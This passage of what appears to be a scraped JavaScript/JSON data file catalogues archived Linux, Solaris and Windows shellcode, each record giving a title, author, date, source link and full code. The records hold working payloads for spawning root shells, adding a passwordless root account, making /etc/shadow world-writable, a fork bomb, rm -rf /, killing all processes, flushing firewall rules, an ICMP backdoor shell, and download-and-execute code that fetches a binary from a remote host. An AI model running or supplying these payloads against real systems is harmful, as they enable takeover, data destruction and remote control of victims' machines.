        // mov $0x4,%al ", "", "\t//", "\t// <_send_http_request>:", "\t//", "", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x99\"                  // cltd ", "\t\"\\x42\"                  // inc %edx ", "", "\t//", "\t// <_wait_for_dbl_crlf>:", "\t//", "", "\t\"\\x49\"                  // dec %ecx ", "\t\"\\xb0\\x03\"              // mov $0x3,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x81\\x39\\x0a\\x0d\\x0a\\x0d\" // cmpl $0xd0a0d0a,(%ecx) ", "\t\"\\x75\\xf3\"              // jne <_wait_for_dbl_crlf> ", "\t\"\\xb2\\x04\"              // mov $0x4,%dl ", "", "\t//", "\t// <_dump_loop_do_read>:", "\t//", "", "\t\"\\xb0\\x03\"              // mov $0x3,%al ", "\t\"\\xf8\"                  // clc ", "", "", "\t//", "\t// <_dump_loop_do_write>:", "\t//", "", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x87\\xde\"              // xchg %ebx,%esi ", "\t\"\\x72\\xf7\"              // jb <_dump_loop_do_read> ", "\t\"\\x85\\xc0\"              // test %eax,%eax ", "\t\"\\x74\\x05\"              // je <_close_file> ", "\t\"\\xb0\\x04\"              // mov $0x4,%al ", "\t\"\\xf9\"                  // stc ", "\t\"\\xeb\\xf1\"              // jmp <_dump_loop_do_write> ", "\t\"\\xb0\\x06\"              // mov $0x6,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x99\"                  // cltd ", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x89\\xfb\"              // mov %edi,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\xeb\\xcc\";             // jmp <_send_http_request> ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-10-22]"]},
{"Title": "Linux/x64 - execve(/bin/sh) Shellcode (33 bytes)", "Author": "hophet", "Published": ": 2006-11-02", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-76.php", "View": null, "code": ["# [Linux/X86-64]", "# Dummy for shellcode:", "# execve(\"/bin/sh\", [\"/bin/sh\"], NULL)", "# hophet [at] gmail.com", "", ".text", "\t.globl _start", "_start:", "\t", "\txorq\t%rdx, %rdx", "\tmovq\t$0x68732f6e69622fff,%rbx", "\tshr\t$0x8, %rbx", "\tpush\t%rbx", "\tmovq\t%rsp,%rdi", "\txorq\t%rax,%rax", "\tpushq\t%rax", "\tpushq\t%rdi", "\tmovq\t%rsp,%rsi", "\tmov\t$0x3b,%al\t# execve(3b)", "\tsyscall", "", "\tpushq\t$0x1", "\tpop\t%rdi", "\tpushq\t$0x3c\t\t# exit(3c)", "\tpop\t%rax", "\tsyscall", "", "", "# milw0rm.com [2006-11-02]"]},
{"Title": "Linux/x86 - setuid(0) + execve(/bin/sh) Shellcode (28 bytes)", "Author": "Revenge", "Published": ": 2006-11-16", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-215.php", "View": null, "code": ["/*", " * revenge-setuid.c, v1.0 2006/09/30 14:57", " *", " * linux/x86 setuid(0) + execve(\"/bin//sh\", [\"/bin//sh\"], NULL) shellcode", " * once again...", " *", " * [    setuid (6 bytes) + execve (22 bytes)  = 28 bytes       ]", " * [                                                           ]", " * [    Same as revenge-execve.c we start the 2 system         ]", " * [    calls with a mov resulting in 2 bytes less, but        ]", " * [    this one is only for suid binary exploitation.         ]", " * [                                                           ]", " *", " * http://www.0xcafebabe.it", " * <revenge@0xcafebabe.it>", " *", " */", "", "char sc[] =", "                                     // <_start>", "       \"\\xb0\\x17\"                    // mov    $0x17,%al", "       \"\\x31\\xdb\"                    // xor    %ebx,%ebx", "       \"\\xcd\\x80\"                    // int    $0x80", "       \"\\xb0\\x0b\"                    // mov    $0xb,%al", "       \"\\x99\"                        // cltd", "       \"\\x52\"                        // push   %edx", "       \"\\x68\\x2f\\x2f\\x73\\x68\"        // push   $0x68732f2f", "       \"\\x68\\x2f\\x62\\x69\\x6e\"        // push   $0x6e69622f", "       \"\\x89\\xe3\"                    // mov    %esp,%ebx", "       \"\\x52\"                        // push   %edx", "       \"\\x53\"                        // push   %ebx", "       \"\\x89\\xe1\"                    // mov    %esp,%ecx", "       \"\\xcd\\x80\"                    // int    $0x80", ";", "", "int main()", "{", "       void    (*fp)(void) = (void (*)(void))sc;", "", "       printf(\"Length: %d\\n\",strlen(sc));", "       fp();", "}", "", "// milw0rm.com [2006-11-16]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (22 bytes)", "Author": "Revenge", "Published": ": 2006-11-16", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-58.php", "View": null, "code": ["/*", " * revenge-execve.c, v1.0 2006/10/14 16:32", " *", " * Yet another linux execve shellcode..", " * linux/x86 execve(\"/bin//sh/\",[\"/bin//sh\"],NULL) shellcode", " *", " * http://www.0xcafebabe.it", " * <revenge@0xcafebabe.it>", " *", " * But this time it's 22 bytes", " *", " * [ We could start the shellcode with a mov instead of (push + pop) eax  ]", " * [ obtaining the same result with 1 byte less, but if we had something  ]", " * [ wrong in eax (ex. -1 due to an unclear function exit) we can't       ]", " * [ inject it                                                            ]", " *", " * */", "", "char sc[] =", "                                     // <_start>", "       \"\\xb0\\x0b\"                    // mov    $0xb,%al", "       \"\\x99\"                        // cltd", "       \"\\x52\"                        // push   %edx", "       \"\\x68\\x2f\\x2f\\x73\\x68\"        // push   $0x68732f2f", "       \"\\x68\\x2f\\x62\\x69\\x6e\"        // push   $0x6e69622f", "       \"\\x89\\xe3\"                    // mov    %esp,%ebx", "       \"\\x52\"                        // push   %edx", "       \"\\x53\"                        // push   %ebx", "       \"\\x89\\xe1\"                    // mov    %esp,%ecx", "       \"\\xcd\\x80\"                    // int    $0x80", ";", "", "int main()", "{", "       void    (*fp)(void) = (void (*)(void))sc;", "", "       printf(\"Length: %d\\n\",strlen(sc));", "       fp();", "}", "", "// milw0rm.com [2006-11-16]"]},
{"Title": "Linux/x86 - Flush IPChains Rules (/sbin/ipchains -F) Shellcode (40 bytes)", "Author": "Kris Katterjohn", "Published": ": 2006-11-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-65.php", "View": null, "code": ["/* By Kris Katterjohn 11/18/2006", " *", " * 40 byte shellcode to flush ipchains for Linux x86", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *", " * ; execve(\"/sbin/ipchains\", { \"/sbin/ipchains\", \"-F\", NULL }, NULL)", " *", " *      push byte 11", " *      pop eax", " *      cdq", " *      push edx", " *      push word 0x462d", " *      mov ecx, esp", " *      push edx", " *      push word 0x736e", " *      push 0x69616863", " *      push 0x70692f6e", " *      push 0x6962732f", " *      mov ebx, esp", " *      push edx", " *      push ecx", " *      push ebx", " *      mov ecx, esp", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] =", "               \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x46\\x89\"", "               \"\\xe1\\x52\\x66\\x68\\x6e\\x73\\x68\\x63\\x68\\x61\"", "               \"\\x69\\x68\\x6e\\x2f\\x69\\x70\\x68\\x2f\\x73\\x62\"", "               \"\\x69\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2006-11-17]"]},
{"Title": "Linux/x86 - Set System Time to 0 + exit() Shellcode (12 bytes)", "Author": "Kris Katterjohn", "Published": ": 2006-11-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-213.php", "View": null, "code": ["/* By Kris Katterjohn 11/18/2006", " *", " * 12 byte shellcode to set system time to 0 and exit. No real damage :)", " *", " * exit() code is the last 5 bytes (0x6a - 0x80)", " *", " * for Linux/x86", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *", " * ; stime([0])", " *", " *      push byte 25", " *      pop eax", " *      cdq", " *      push edx", " *      mov ebx, esp", " *      int 0x80", " *", " * ; exit()", " *", " *      inc eax", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] = \"\\x6a\\x19\\x58\\x99\\x52\\x89\\xe3\\xcd\\x80\\x40\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2006-11-17]"]},
{"Title": "Linux/x86 - Add Root User (r00t) To /etc/passwd Shellcode (69 bytes)", "Author": "Kris Katterjohn", "Published": ": 2006-11-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-211.php", "View": null, "code": ["/* By Kris Katterjohn 11/14/2006", " *", " * 69 byte shellcode to add root user 'r00t' with no password to /etc/passwd", " *", " * for Linux/x86", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *", " * ; open(\"/etc//passwd\", O_WRONLY | O_APPEND)", " *", " *      push byte 5", " *      pop eax", " *      xor ecx, ecx", " *      push ecx", " *      push 0x64777373", " *      push 0x61702f2f", " *      push 0x6374652f", " *      mov ebx, esp", " *      mov cx, 02001Q", " *      int 0x80", " *", " *      mov ebx, eax", " *", " * ; write(ebx, \"r00t::0:0:::\", 12)", " *", " *      push byte 4", " *      pop eax", " *      xor edx, edx", " *      push edx", " *      push 0x3a3a3a30", " *      push 0x3a303a3a", " *      push 0x74303072", " *      mov ecx, esp", " *      push byte 12", " *      pop edx", " *      int 0x80", " *", " * ; close(ebx)", " *", " *      push byte 6", " *      pop eax", " *      int 0x80", " *", " * ; exit()", " *", " *      push byte 1", " *      pop eax", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] =", "               \"\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77\\x64\\x68\"", "               \"\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x66\"", "               \"\\xb9\\x01\\x04\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x31\\xd2\"", "               \"\\x52\\x68\\x30\\x3a\\x3a\\x3a\\x68\\x3a\\x3a\\x30\\x3a\\x68\"", "               \"\\x72\\x30\\x30\\x74\\x89\\xe1\\x6a\\x0c\\x5a\\xcd\\x80\\x6a\"", "               \"\\x06\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2006-11-17]"]},
{"Title": "Linux/x86 - chmod 0666 /etc/shadow + exit() Shellcode (36 bytes)", "Author": "Kris Katterjohn", "Published": ": 2006-11-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-210.php", "View": null, "code": ["/* By Kris Katterjohn 8/29/2006", " *", " * 36 byte shellcode to chmod(\"/etc/shadow\", 0666) and exit for Linux/x86", " *", " * To remove exit(): Remove the last 5 bytes (0x6a - 0x80)", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *      xor edx, edx", " *", " *      push byte 15", " *      pop eax", " *      push edx", " *      push byte 0x77", " *      push word 0x6f64", " *      push 0x6168732f", " *      push 0x6374652f", " *      mov ebx, esp", " *      push word 0666Q", " *      pop ecx", " *      int 0x80", " *", " *      push byte 1", " *      pop eax", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] =", "               \"\\x31\\xd2\\x6a\\x0f\\x58\\x52\\x6a\\x77\\x66\\x68\\x64\\x6f\\x68\"", "               \"\\x2f\\x73\\x68\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x66\\x68\"", "               \"\\xb6\\x01\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2006-11-17]"]},
{"Title": "Linux/x86 - Fork Bomb Shellcode (7 bytes)", "Author": "Kris Katterjohn", "Published": ": 2006-11-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-214.php", "View": null, "code": ["/* By Kris Katterjohn 8/29/2006", " *", " * 7 byte shellcode for a forkbomb", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *      push byte 2", " *      pop eax", " *      int 0x80", " *      jmp short _start", " */", "", "main()", "{", "       char shellcode[] = \"\\x6a\\x02\\x58\\xcd\\x80\\xeb\\xf9\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2006-11-17]"]},
{"Title": "Linux/x86 - execve(rm -rf /) Shellcode (45 bytes)", "Author": "Kris Katterjohn", "Published": ": 2006-11-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-57.php", "View": null, "code": ["/* By Kris Katterjohn 11/18/2006", " *", " * 45 byte shellcode to execve(\"rm -rf /\") for Linux/x86", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *", " * ; execve(\"/bin/rm\", { \"/bin/rm\", \"-r\", \"-f\", \"/\", NULL }, NULL)", " *", " *      push byte 11", " *      pop eax", " *      cdq", " *      push edx", " *      push byte 0x2f", " *      mov edi, esp", " *      push edx", " *      push word 0x662d", " *      mov esi, esp", " *      push edx", " *      push word 0x722d", " *      mov ecx, esp", " *      push edx", " *      push 0x6d722f2f", " *      push 0x6e69622f", " *      mov ebx, esp", " *      push edx", " *      push edi", " *      push esi", " *      push ecx", " *      push ebx", " *      mov ecx, esp", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] =", "               \"\\x6a\\x0b\\x58\\x99\\x52\\x6a\\x2f\\x89\\xe7\\x52\\x66\\x68\\x2d\\x66\\x89\"", "               \"\\xe6\\x52\\x66\\x68\\x2d\\x72\\x89\\xe1\\x52\\x68\\x2f\\x2f\\x72\\x6d\\x68\"", "               \"\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x57\\x56\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2006-11-17]"]},
{"Title": "Linux/x86 - execve() + Read Shellcode (92 bytes)", "Author": "0ut0fbound", "Published": ": 2006-11-20", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-204.php", "View": null, "code": ["#    XCHG Research Group", "#    Linux/x86 execve read shellcode - 92 bytes", "#    ", "#    ", "#    )--[ Writed by 0ut0fbound ]--(", "#    ", "#    - http://outofbound.host.sk", "#    - http://xchglabs.host.sk", "", ".text", "", "\t.globl _start", "", "_start:", "", "# EAX = 0x04 -> syscall write()", "\txorl %eax, %eax", "\tmovb $0x4, %al", "\txorl %ebx, %ebx", "\tinc %ebx", "\tpushl $0x20202020", "\tpushl $0x3a646e61", "\tpushl $0x6d6d6f43", "\tmovl %esp, %ecx", "\txorl %edx, %edx", "\tmovb $0x9, %dl", "\tint $0x80 ", "\t", "# EAX = 0x03 -> syscall read()", "\txorl %eax, %eax", "\tmovb $0x3, %al", "\txorl %ebx, %ebx", "\txorl %edx, %edx", "\tmovb $0x20, %dl", "\tsubl %edx, %esp", "\tmovl %esp, %ecx", "\tint $0x80 ", "\t", "# buffer[read(0, buffer, sizeof(buffer))] = 0;", "\taddl %eax, %ecx", "\tdec %ecx ", "\tmovl %ebx, (%ecx)", "\t", "\tmovl %esp, %ebx", "\taddl %eax, %ebx", "\tmovl %eax, %ecx", "\t", "\txorl %edx, %edx", "\tpush %edx ", "\t", "LOOP1: ", "\tmovb (%ebx), %al", "\tcmp $0x20, %al", "\tjne CONT ", "\txorb $0x20, (%ebx)", "\tinc %ebx ", "\tpushl %ebx ", "\tdec %ebx ", "CONT: ", "\tdec %ebx ", "loop LOOP1 ", "\t", "\tpush %ebx ", "\t", "\tmovl %esp, %ecx", "\txorl %eax, %eax", "\tmovb $0xb, %al", "\t", "\tint $0x80 ", "\t", "# EAX = 0x01 -> syscall exit", "\txorl %eax, %eax", "\tinc %al ", "\txorl %ebx, %ebx", "\tint $0x80 ", "", "# milw0rm.com [2006-11-20]"]},
{"Title": "Solaris/MIPS - Download File (http://10.1.1.2:80/evil-dl) + Execute (/tmp/ff) Shellcode (278 bytes)", "Author": "xort", "Published": ": 2006-11-21", "Platform": "Solaris_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-240.php", "View": null, "code": ["/*", "", " black-dl-exec-SOLARIS.c (MIPS)  [278:bytes]", " Dowloads a binary from host given named 'evil-dl' to '/tmp/ff' then executes.", " 11.21.6  Russell Sanford  (xort@blacksecurity.org)", "", " gcc -lnsl black-dl-exec-SOLARIS.c -o bdes", "", "*/", "", "#include <sys/socket.h>", "#include <netinet/in.h>", "#include <arpa/inet.h>", "", "// opcode encodings for performing sethi/or against/into register %o1 w/ nulled data", "", "#define SETHI_O1 0x13000000", "#define OR_O1\t 0x92126000", "", "char dl_exec_sh[] =", "\"\\xa6\\x1a\\xc0\\x0b\\x20\\xbf\\xff\\xff\\x20\\xbf\\xff\\xff\\x7f\\xff\\xff\\xff\\x90\\x10\\x20\\x02\\x92\\x10\\x20\\x02\"", "\"\\x94\\x1a\\x80\\x0a\\x96\\x1a\\xc0\\x0b\\x98\\x10\\x20\\x01\\x82\\x10\\x20\\xe6\\x91\\xd0\\x20\\x08\\xc0\\x2b\\xe0\\xa6\"", "\"\\xd0\\x23\\xbf\\xfc\\x92\\x20\\x3f\\xfe\\x93\\x2a\\x60\\x10\\x92\\x22\\x7f\\xb0\\xd2\\x23\\xbf\\xec\\x13\\x37\\xab\\x6f\"", "\"\\x92\\x12\\x62\\xef\\xd2\\x23\\xbf\\xf0\\xc0\\x23\\xbf\\xf4\\x92\\x03\\xbf\\xec\\x94\\x10\\x20\\x10\\x82\\x10\\x20\\xeb\"", "\"\\x91\\xd0\\x20\\x08\\xc0\\x2b\\xe1\\x0e\\x92\\x03\\xe0\\xfc\\x94\\x20\\x3f\\xf2\\xd0\\x03\\xbf\\xfc\\x82\\x10\\x20\\x04\"", "\"\\x91\\xd0\\x20\\x08\\xc0\\x2b\\xe0\\xfb\\x90\\x03\\xe0\\xf4\\x94\\x20\\x3c\\x13\\x92\\x20\\x3e\\xfe\\x82\\x10\\x20\\x05\"", "\"\\x91\\xd0\\x20\\x08\\xd0\\x23\\xbf\\xf8\\xd0\\x03\\xbf\\xfc\\x92\\x03\\xbf\\xc4\\x94\\x10\\x20\\x14\\x82\\x10\\x20\\x03\"", "\"\\x91\\xd0\\x20\\x08\\xa4\\xa4\\xc0\\x08\\x02\\x80\\xFF\\x06\\x94\\x0a\\x3f\\xff\\xd0\\x03\\xbf\\xf8\\x82\\x10\\x20\\x04\"", "\"\\x91\\xd0\\x20\\x08\\x10\\xbf\\xff\\xf5\\x94\\x1a\\x80\\x0a\\xd4\\x23\\xe0\\xfc\\xd4\\x23\\xe0\\xf0\\x90\\x03\\xe0\\xf4\"", "\"\\xd0\\x23\\xe0\\xec\\x92\\x03\\xe0\\xec\\x82\\x10\\x20\\x0b\\x91\\xd0\\x20\\x08\\x6f\\x6d\\x66\\x67\\x20\\x73\\x6f\\x6c\"", "\"\\x61\\x72\\x69\\x73\\x20\\x73\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x7a\\x21\\x2f\\x74\\x6d\\x70\\x2f\\x71\\x71\\x41\"", "\"\\x47\\x45\\x54\\x20\\x2f\\x65\\x76\\x69\\x6c\\x2d\\x64\\x6c\\x0a\\x0a\"; ", "", "", "void patchcode(long webserver) {", "", "\t// fix sethi instruction to set up ip.", "\t*(long *)&dl_exec_sh[68] = SETHI_O1 + ((webserver)>>10 & 0x3fffff);", "", "\t// FIX or instruction to set up ip.", "\t*(long *)&dl_exec_sh[72] = OR_O1 + (webserver & 0x2ff);", "}", "", "void (*fakefunc)();", "", "void main() {", "", "\tpatchcode(inet_addr(\"10.1.1.2\"));", "\tchar *buffer = (char *) malloc(1024);", "\tmemcpy(buffer, dl_exec_sh, 280);", "\tfakefunc = buffer;", "\tfakefunc();", "}", "", "// milw0rm.com [2006-11-21]"]}
]

const pag_5 = [{"Title": "Linux/x86 - Flush IPTables Rules (/sbin/iptables -F) Shellcode (40 bytes)", "Author": "Kris Katterjohn", "Published": ": 2007-03-09", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13344.c", "View": "https://old.exploit-db.com/raw/13344/", "code": ["/* By Kris Katterjohn 11/18/2006", " *", " * 40 byte shellcode to flush iptables for Linux x86", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *", " * ; execve(\"/sbin/iptables\", { \"/sbin/iptables\", \"-F\", NULL }, NULL)", " *", " *      push byte 11", " *      pop eax", " *      cdq", " *      push edx", " *      push word 0x462d", " *      mov ecx, esp", " *      push edx", " *      push word 0x7365", " *      push 0x6c626174", " *      push 0x70692f6e", " *      push 0x6962732f", " *      mov ebx, esp", " *      push edx", " *      push ecx", " *      push ebx", " *      mov ecx, esp", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] =", "               \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x46\\x89\"", "               \"\\xe1\\x52\\x66\\x68\\x65\\x73\\x68\\x74\\x61\\x62\"", "               \"\\x6c\\x68\\x6e\\x2f\\x69\\x70\\x68\\x2f\\x73\\x62\"", "               \"\\x69\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2007-03-09]"]},
{"Title": "Linux/x86 - Kill All Processes Shellcode (11 bytes)", "Author": "Kris Katterjohn", "Published": ": 2007-03-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-212.php", "View": null, "code": ["/* By Kris Katterjohn 11/13/2006", " *", " * 11 byte shellcode to kill all processes for Linux/x86", " *", " *", " *", " * section .text", " *", " *      global _start", " *", " * _start:", " *", " * ; kill(-1, SIGKILL)", " *", " *      push byte 37", " *      pop eax", " *      push byte -1", " *      pop ebx", " *      push byte 9", " *      pop ecx", " *      int 0x80", " */", "", "main()", "{", "       char shellcode[] = \"\\x6a\\x25\\x58\\x6a\\xff\\x5b\\x6a\\x09\\x59\\xcd\\x80\";", "", "       (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2007-03-09]"]},
{"Title": "Linux/x86 - Raw-Socket ICMP/Checksum Shell (/bin/sh) Shellcode (235 bytes)", "Author": "mu-b", "Published": ": 2007-04-02", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-209.php", "View": null, "code": [";", "; Copyright (c) 2007 by <mu-b@digit-labs.org>", ";", "; 235-byte raw-socket ICMP/checksum shell - (x86-lnx)", "; by mu-b - Nov 2006", ";", "; icmp with identifier __flag_byte and commands in the", "; following format:-", ";       \"/bin/sh\\x00-c\\x00<command here>\\x00\"", ";", "; unlike *other* icmp shells, this will reply with", "; 255-(sizeof icmp_hdr) bytes of output..", ";", "", "%define zero_reg        esi", "%define zero_reg_w      si", "%define sock_reg        edi", "%define __flag_byte     6996h", "", "global _shell", "", "_shell:", " xor   zero_reg, zero_reg", " mov   ebp, esp", "", " ; sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);", "_socket:", " lea   ebx, [zero_reg+3]", " push  byte 1", " push  ebx", " dec   ebx", " push  ebx", " dec   ebx", " mov   ecx, esp", " lea   eax, [zero_reg+66h]", " int   80h                 ; socket();", " mov   sock_reg, eax", "", " ; setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &1, 1);", "_setsockopt:", " push  ebx", " push  esp", " push  byte 3h", " push  zero_reg", " push  sock_reg", " mov   ecx, esp", " mov   bl, byte 0eh", " mov   al, byte 66h", " int   80h                 ; setsocketopt();", "", " ; while(1)", "_while_loop:", " ; read(sockfd, cmd, 255);", " cdq", " dec   byte dl", " mov   ecx, ebp", " mov   ebx, sock_reg", " lea   eax, [zero_reg+3]", " int   80h                 ; read();", "", " lea   ebx, [ebp+24]", " xor   [ebx], word __flag_byte", " jne   short _while_loop", "", " ; pipe(pp)", " lea   ebx, [ebp-8]", " mov   al, byte 2ah", " int   80h                 ; pipe();", "", " ; fork()", " mov   al, byte 2h", " int   80h                 ; fork();", " test  eax, eax", " jnz   short _parent", "", "_child:", " ; close(pp[0])", " mov   ebx, [ebp-8]", " mov   al, byte 6h", " int   80h                 ; close();", "", " ; dup2(pp[1], 0); dup2(pp[1], 1); dup2(pp[1], 2);", " lea   ecx, [zero_reg+3]", " ; pp[1] == pp[0]+1", " inc   ebx", "", ".1:", " dec   ecx", " mov   al, byte 3fh", " int   80h                 ; dup2();", " jnz   .1", "", " ; execve(cmd + 28, {cmd + 28, cmd + 36, cmd + 39, 0}, 0);", " push  zero_reg", " lea   ebx, [ebp+39]", " push  ebx", " sub   ebx, byte 3", " push  ebx", " sub   ebx, byte 8", " push  ebx", " mov   ecx, esp", " cdq", " mov   al, byte 0bh", " int   80h                 ; execve();", "", "_parent:", " ; close(pp[1])", " mov   ebx, [ebp-4]", " lea   eax, [zero_reg+6]", " int   80h                 ; close();", "", "_parent_read:", ".1:", " ; read(pp[0], cmd, bytes_left);", " ; edx == 255", " lea   ecx, [ebp+28]", " mov   ebx, [ebp-8]", " mov   al, byte 3h", " int   80h                 ; read();", " test  eax, eax", " jl    _while_loop", "", " mov   al, byte 6h", " int   80h                 ; close();", "", ".2:", " ; fix up ttl (optional?! make sure its high!)", " ; mov   [ebp+8], byte 0ffh", "", " ; switch ip's", " mov   ecx, [ebp+12]", " xchg  [ebp+16], ecx", " mov   [ebp+12], ecx", "", " ; set icmp type to echo reply (optional?!)", " ;mov   [ebp+20], word zero_reg_w", " ; zero checksum", " ;mov   [ebp+22], word zero_reg_w", " ; set icmp type to echo and zero checksum", " mov   [ebp+20], zero_reg", "", " lea   ecx, [zero_reg+117]", " lea   esi, [ebp+20]", " cdq", "", ".3:", " lodsw", " add   edx, eax", " loop  .3", "", " lodsb", " xor   ah, ah", " add   eax, edx", " mov   esi, eax", "", " shr   eax, byte 16", " movzx esi, si", " add   eax, esi", " mov   edx, eax", " shr   edx, byte 16", " add   eax, edx", " not   ax", "", " ; set checksum", " mov   [ebp+22], word ax", "", " cdq", " xor   eax, eax", " xor   zero_reg, zero_reg", "", " ; struct sockaddr *", " push  zero_reg", " push  zero_reg", " push  dword [ebp+16]", " push  byte 2", "", " ; sendto(sockfd, cmd, 255, 0, ...);", " mov   ecx, esp", " push  byte 16", " push  ecx", " push  zero_reg", " mov   dl, byte 0ffh", " push  edx", " push  ebp", " push  sock_reg", " mov   ecx, esp", " mov   bl, 0bh", " mov   al, 66h", " int   80h                 ; sendto();", "", " cdq", " mov   ecx, ebp", " mov   ebx, zero_reg", " mov   al, 72h", " int   80h                 ; wait();", "", " jmp   _while_loop", "", "; milw0rm.com [2007-04-02]"]},
{"Title": "Windows/x86 (NT/XP) - IsDebuggerPresent Shellcode (39 bytes)", "Author": "ex-pb", "Published": ": 2007-05-31", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-153.php", "View": null, "code": ["/* Shellcode Length: 39 bytes  */", "/* sets PEB->BeingDebugged to 0 */", "/* IsDebuggerPresent()/BeingDebugged bypass */", "/* by ex-pb @ screw_you@web.de */", "/* greets: xgx and all i forgot */", "", "#include <stdio.h>", "#include <windows.h>", "", "char ShellCode[] = \"\\xEB\"", "\"\\x0F\\x58\\x80\\x30\\x95\\x40\\x81\\x38\\x68\\x61\\x63\\x6B\\x75\\xF4\\xEB\\x05\\xE8\\xEC\\xFF\\xFF\"", "\"\\xFF\\xF1\\x34\\xA5\\x95\\x95\\x95\\xAB\\x53\\xD5\\x97\\x95\\x56\\x68\\x61\\x63\\x6B\\xCD\";", "", "int main()", "{", "\tprintf(\"Shellcode length: %d\\n\", strlen(ShellCode));", "\treturn 0;", "}", "", "// milw0rm.com [2007-05-31]"]},
{"Title": "Windows/x86 - Download File (http://127.0.0.1/file.exe) + Execute Shellcode (124 bytes)", "Author": "Weiss", "Published": ": 2007-06-14", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-392.php", "View": null, "code": [";", "; relocateable dynamic runtime assembly code example using hash lookup *** for IE exploits only ***", "; the URLMON.DLL must already be loaded into the process space for this to work, so do not run on its own!!", ";", "; to test use /DTEST_CODE in ml command line", ";", "; URLDownLoadToFileA() / WinExec() / ExitProcess() | ExitThread()", ";", "; 124 bytes", ";", "; for testing:", ";", "; ml /c /coff /Cp /DTEST_CODE dexec32.asm", "; link /subsystem:windows /section:.text,w dexec32.obj urlmon.lib", ";", "; wyse101 [at] gmail.com", ";", "; March 2007", ";", "      .386", "      .model flat,stdcall", "", "      ROL_CONSTANT equ 5", "", "      mrol macro iNum:req,iBits:req", "           exitm <(iNum shl iBits) or (iNum shr (32-iBits))>", "      endm", "", "      mror macro iNum:req,iBits:req", "           exitm <(iNum shr iBits) or (iNum shl (32-iBits))>", "      endm", "", "      hashapi macro szApi", "              local dwApi", "", "              dwApi = 0", "", "              forc x,szApi", "                   dwApi = dwApi + '&x'", "                   dwApi = mrol(dwApi,ROL_CONSTANT)", "              endm", "              dwApi = mrol(dwApi,ROL_CONSTANT)", "              dw (dwApi and 0ffffh)", "      endm", "", "      .code", "", "      assume fs:nothing", "", "code_start:", "      jmp load_data", "IFDEF TEST_CODE", "extern URLDownloadToFileA   :proc", "      call URLDownloadToFileA                     ; included when assembled with /DTEST_CODE", "ENDIF", "setup_parameters:", "      pop edi                                     ; offset @cmd_start", "      xor eax,eax                                 ; eax = 0", "      cdq                                         ; edx = 0", "      ; ********************************************************************", "      push eax                                    ; exit code  = 0", "      ; ********************************************************************", "      push eax                                    ; 